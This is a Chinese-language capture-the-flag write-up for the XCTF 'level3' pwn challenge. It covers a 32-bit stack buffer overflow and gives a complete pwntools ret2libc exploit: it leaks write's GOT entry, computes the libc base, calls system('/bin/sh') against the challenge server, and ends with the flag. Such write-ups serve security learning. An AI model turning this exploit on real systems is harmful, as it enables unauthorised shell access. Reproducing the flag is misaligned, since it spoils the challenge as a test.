# level3

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=49f986c6-2097-4c70-ae7e-d4e5302b7645_2&task_category_id=2)

普通的ret2libc，没有任何干扰。

```c
void vulnerable_function(void)
{
  undefined local_8c [136];
  write(1,"Input:\n",7);
  read(0,local_8c,256);
  return;
}
```

只调用了write，那就没办法用puts了。write在32位下也不难，用法就是1+要打印的地址+4（1固定表示从stdin读取，4是要打印的字节数）。得到第一个泄露write真实地址的payload。

- b'a'*0x8c+p32(write_plt)+p32(vuln_addr)+p32(1)+p32(write_got)+p32(4)

本来想放到在线libc数据库去查，但是试了很久还是失败。换个机子用pwntools找。

```python
from pwn import *
libc=ELF("lib")
print(libc.symbols['system'])
```

libc我重命名了。找libc内函数的偏移使用libc.symbols['要找偏移的函数']，跟照got和plt还是有区别的。/bin/sh在libc的偏移要用ROPgadget找，pwntools好像不行。

-  ROPgadget --binary lib --string '/bin/sh'

泄露地址-函数偏移=运行时libc加载的基地址。得到基地址就可以根据偏移算要用的函数了。exp如下。

```python
from pwn import *
p=remote("61.147.171.105",64057)
write_plt=134513472
write_got=134520856
vuln_addr=0x0804844b
payload=b'a'*0x8c+p32(write_plt)+p32(vuln_addr)+p32(1)+p32(write_got)+p32(4)
p.sendlineafter("Input:",payload)
p.recvuntil(b'\n')
write_addr=u32(p.recv(4))
bin_sh_offset=0x0015902b
system_offset=239936
write_libc=869312
lib_base=write_addr-write_libc
payload=b'a'*0x8c+p32(lib_base+system_offset)+p32(vuln_addr)+p32(lib_base+bin_sh_offset)
p.sendlineafter("Input:",payload)
p.interactive()
```

- ### Flag
  > cyberpeace{d5c95af6be20ee7795dc857718caec4f}